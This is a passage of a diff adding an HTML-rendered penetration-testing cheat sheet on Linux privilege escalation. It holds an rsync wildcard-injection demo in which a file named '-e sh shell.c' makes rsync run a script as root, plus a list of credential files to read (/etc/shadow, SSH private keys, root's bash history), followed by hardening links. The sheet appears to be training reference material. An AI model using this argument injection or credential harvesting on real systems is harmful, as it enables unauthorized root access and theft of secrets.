+<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+</pre></div></li>
+<li>Rcync command Execution
+    <div class="codehilite"><pre><span></span>-e, --rsh<span class="o">=</span>COMMAND           specify the remote shell to use
+    --rsync-path<span class="o">=</span>PROGRAM    specify the rsync to run on remote machine
+</pre></div>
+    <div class="codehilite"><pre><span></span><span class="c1"># ls -al</span>
+-rw-r--r--.  <span class="m">1</span> leon leon     <span class="m">0</span> Mar <span class="m">28</span> <span class="m">04</span>:45 -e sh shell.c
+-rwxr-xr-x.  <span class="m">1</span> user user   <span class="m">117</span> Oct <span class="m">28</span> <span class="m">17</span>:36 inc.php
+-rwxr-xr-x.  <span class="m">1</span> user user   <span class="m">111</span> Oct <span class="m">28</span> <span class="m">17</span>:38 index.php
+-rwxr-xr-x.  <span class="m">1</span> leon leon    <span class="m">31</span> Mar <span class="m">28</span> <span class="m">04</span>:45 shell.c
+
+<span class="c1"># rsync -t *.c foo:src/</span>
+rsync: connection unexpectedly closed <span class="o">(</span><span class="m">0</span> bytes received so far<span class="o">)</span> <span class="o">[</span>sender<span class="o">]</span>
+rsync error: error in rsync protocol data stream <span class="o">(</span>code <span class="m">12</span><span class="o">)</span> at io.c<span class="o">(</span><span class="m">601</span><span class="o">)</span> <span class="o">[</span><span class="nv">sender</span><span class="o">=</span><span class="m">3</span>.0.8<span class="o">]</span>
+
+<span class="c1"># ls -al</span>
+-rw-r--r--.  <span class="m">1</span> leon leon     <span class="m">0</span> Mar <span class="m">28</span> <span class="m">04</span>:45 -e sh shell.c
+-rwxr-xr-x.  <span class="m">1</span> user user   <span class="m">117</span> Oct <span class="m">28</span> <span class="m">17</span>:36 inc.php
+-rwxr-xr-x.  <span class="m">1</span> user user   <span class="m">111</span> Oct <span class="m">28</span> <span class="m">17</span>:38 index.php
+-rwxr-xr-x.  <span class="m">1</span> leon leon    <span class="m">31</span> Mar <span class="m">28</span> <span class="m">04</span>:45 shell.c
+-rw-r--r--.  <span class="m">1</span> root root   <span class="m">101</span> Mar <span class="m">28</span> <span class="m">04</span>:49 shell_output.txt
+
+<span class="c1"># cat shell.c</span>
+/usr/bin/id &gt; shell_output.txt
+
+<span class="c1"># cat shell_output.txt</span>
+<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+</pre></div></li>
+<li>Practice<ul>
+<li>HTB - Joker</li>
+</ul>
+</li>
+<li>Create a script, setuid bit and then use this attack to <code class="codehilite"><span class="n">chown</span></code> the script to gain prev-esc</li>
+</ul>
+<h2 id="important-files">Important Files<a class="headerlink" href="#important-files" title="Permanent link">&para;</a></h2>
+<ul>
+<li>GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions: <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li>
+<li>Files owned by User: <code class="codehilite"><span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="k">type</span> <span class="n">f</span> <span class="o">-</span><span class="n">uid</span> <span class="mi">1000</span> <span class="o">-</span><span class="n">ls</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="k">null</span></code></li>
+<li>Environment variables: <code class="codehilite"><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="k">self</span><span class="o">/</span><span class="n">environ</span></code></li>
+<li>Email: <code class="codehilite"><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">mail</span><span class="o">/</span><span class="k">USER</span></code></li>
+<li>Private keys: <code class="codehilite"><span class="o">~/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span></code></li>
+<li>APT sources: <code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">apt</span><span class="o">/</span><span class="n">sources</span><span class="p">.</span><span class="n">list</span></code></li>
+<li>Order of name resolution: <code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">nsswitch</span><span class="p">.</span><span class="n">conf</span></code></li>
+<li>DNS Hosts File: <code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span></code></li>
+<li>DNS sever Information: <code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">resolv</span><span class="p">.</span><span class="n">conf</span></code></li>
+<li>Kernel module config: <code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">sysctl</span><span class="p">.</span><span class="n">conf</span></code></li>
+<li>Sys calls: <code class="codehilite"><span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="k">include</span> <span class="o">/</span><span class="nv">i386</span><span class="o">-</span><span class="nv">linux</span><span class="o">-</span><span class="nv">gnu</span><span class="o">/</span><span class="nv">asm</span><span class="o">/</span><span class="nv">unistd_32</span>.<span class="nv">h</span></code></li>
+<li>Os Info: <code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">issue</span></code> <code class="codehilite"><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="k">version</span></code></li>
+<li>Cron: <code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">crontab</span></code></li>
+<li>Bootloader - GRUB2<ul>
+<li>Main configuration file (replaces <code class="codehilite"><span class="n">menu</span><span class="p">.</span><span class="n">lst</span></code> in GRUB (v1)): <code class="codehilite"><span class="o">/</span><span class="n">boot</span><span class="o">/</span><span class="n">grub</span><span class="o">/</span><span class="n">grub</span><span class="p">.</span><span class="n">cfg</span></code></li>
+<li>Directory contains the scripts that build the <code class="codehilite"><span class="n">grub</span><span class="p">.</span><span class="n">cfg</span></code>: <code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">grub</span><span class="p">.</span><span class="n">d</span></code><ul>
+<li><code class="codehilite"><span class="mi">00</span><span class="n">_header</span></code> - Loads the settings from <code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="k">default</span><span class="o">/</span><span class="n">grub</span></code></li>
+<li><code class="codehilite"><span class="mi">05</span><span class="n">_debian_theme</span></code> - Defines the colors, background, etc.</li>
+<li><code class="codehilite"><span class="mi">10</span><span class="n">_linux</span></code> - Loads the menu entries</li>
+<li><code class="codehilite"><span class="mi">20</span><span class="n">_memtest86</span></code> - Loads the memory tester</li>
+<li><code class="codehilite"><span class="mi">30</span><span class="n">_os</span><span class="o">-</span><span class="n">prober</span></code> - Scans the hard drives for other operating systems</li>
+<li><code class="codehilite"><span class="mi">40</span><span class="n">_custom</span></code> - Template for manually adding other menu entries</li>
+</ul>
+</li>
+<li>File contains the GRUB menu settings: <code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="k">default</span><span class="o">/</span><span class="n">grub</span></code><ul>
+<li>Run <code class="codehilite"><span class="k">update</span><span class="o">-</span><span class="n">grub</span></code> after modifying.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Samba: <code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">samba</span><span class="o">/</span><span class="n">smb</span><span class="p">.</span><span class="n">conf</span></code></li>
+<li>Logs:<ul>
+<li>Syslog: <code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">rsyslog</span><span class="p">.</span><span class="n">conf</span></code></li>
+<li>Log mail events of all priorities to /var/log/mail: <code class="codehilite"><span class="n">mail</span><span class="p">.</span><span class="o">*</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">mail</span></code></li>
+<li>Log all events of the emergency priority (emerg) to all logged on users: <code class="codehilite"><span class="na">.emerg</span></code></li>
+</ul>
+</li>
+<li>Squid Proxy: <code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">squid</span><span class="o">/</span><span class="n">squid</span><span class="p">.</span><span class="n">conf</span></code> <code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">squid</span><span class="o">/</span><span class="n">passwords</span></code></li>
+<li>Apache:<ul>
+<li><code class="codehilite"><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="k">access</span><span class="p">.</span><span class="n">log</span></code></li>
+<li><code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">sites</span><span class="o">-</span><span class="n">enabled</span><span class="o">/</span><span class="mi">000</span><span class="o">-</span><span class="k">default</span><span class="p">.</span><span class="n">conf</span></code></li>
+<li><code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">apache</span><span class="o">/</span><span class="n">sites</span><span class="o">-</span><span class="n">enabled</span><span class="o">/</span><span class="mi">000</span><span class="o">-</span><span class="k">default</span><span class="p">.</span><span class="n">conf</span></code></li>
+<li><code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">sites</span><span class="o">-</span><span class="n">enabled</span><span class="o">/</span><span class="mi">000</span><span class="o">-</span><span class="k">default</span><span class="p">.</span><span class="n">conf</span></code></li>
+</ul>
+</li>
+<li>TFTPD: <code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="k">default</span><span class="o">/</span><span class="n">tftpd</span><span class="o">-</span><span class="n">hpa</span></code></li>
+<li>PHP Sessions: <code class="codehilite"><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">sess_ID</span></code> <code class="codehilite"><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">php5</span><span class="o">/</span><span class="n">sess_ID</span></code></li>
+</ul>
+<div class="codehilite"><pre><span></span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">issue</span>
+<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="k">version</span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">profile</span>
+<span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">bash_history</span>
+<span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">dmessage</span>
+<span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">mail</span><span class="o">/</span><span class="n">root</span>
+<span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">cron</span><span class="o">/</span><span class="n">crontabs</span><span class="o">/</span><span class="n">root</span>
+</pre></div>
+
+<p><strong>Passwords</strong></p>
+<div class="codehilite"><pre><span></span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">shadow</span>
+
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pwd</span><span class="p">.</span><span class="n">db</span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
+
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">spwd</span><span class="p">.</span><span class="n">db</span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">shadow</span>
+
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">master</span><span class="p">.</span><span class="n">passwd</span>
+</pre></div>
+
+<h2 id="special-file-handling">Special File Handling<a class="headerlink" href="#special-file-handling" title="Permanent link">&para;</a></h2>
+<ul>
+<li>7z files<ul>
+<li>Print file information: <code class="codehilite"><span class="mi">7</span><span class="n">z</span> <span class="n">l</span> <span class="o">-</span><span class="n">slt</span> <span class="n">example</span><span class="p">.</span><span class="n">zip</span></code></li>
+<li>Extract: <code class="codehilite"><span class="mi">7</span><span class="n">z</span> <span class="n">x</span> <span class="n">example</span><span class="p">.</span><span class="n">zip</span></code></li>
+</ul>
+</li>
+<li>Microsoft Outlook Personal Folder (PST)<ul>
+<li>Examine: <code class="codehilite"><span class="n">readpst</span> <span class="o">-</span><span class="n">tea</span> <span class="o">-</span><span class="n">m</span> <span class="n">example</span><span class="p">.</span><span class="n">pst</span></code></li>
+</ul>
+</li>
+</ul>
+<h2 id="defense">Defense<a class="headerlink" href="#defense" title="Permanent link">&para;</a></h2>
+<p><strong>References</strong></p>
+<ul>
+<li>PAM vs NSS: <a href="https://serverfault.com/questions/538383/understand-pam-and-nss/">https://serverfault.com/questions/538383/understand-pam-and-nss/</a></li>
+<li>Support to authenticate against PostgreSQL for PAM-enabled appliations: <a href="https://github.com/pam-pgsql/pam-pgsql">https://github.com/pam-pgsql/pam-pgsql</a></li>
+</ul>
+<p>Point of no C3 | Linux Kernel Exploitation</p>
+<ul>
+<li><a href="https://0x00sec.org/t/point-of-no-c3-linux-kernel-exploitation-part-0/11585">https://0x00sec.org/t/point-of-no-c3-linux-kernel-exploitation-part-0/11585</a></li>
+<li><a href="https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850">https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850</a></li>
+</ul>
+<p><strong>Tools</strong></p>
+<ul>
+<li>Locally checks for signs of a rootkit: <a href="http://www.chkrootkit.org/">http://www.chkrootkit.org/</a></li>
+</ul>
+<p><strong>Checklists</strong></p>
+<ul>
+<li>Linux hardening checklist: <a href="https://github.com/trimstray/linux-hardening-checklist">https://github.com/trimstray/linux-hardening-checklist</a></li>
+<li>Kernel hardning checklist: <a href="https://github.com/a13xp0p0v/kconfig-hardened-check">https://github.com/a13xp0p0v/kconfig-hardened-check</a></li>
+</ul>
                 
                   
                 
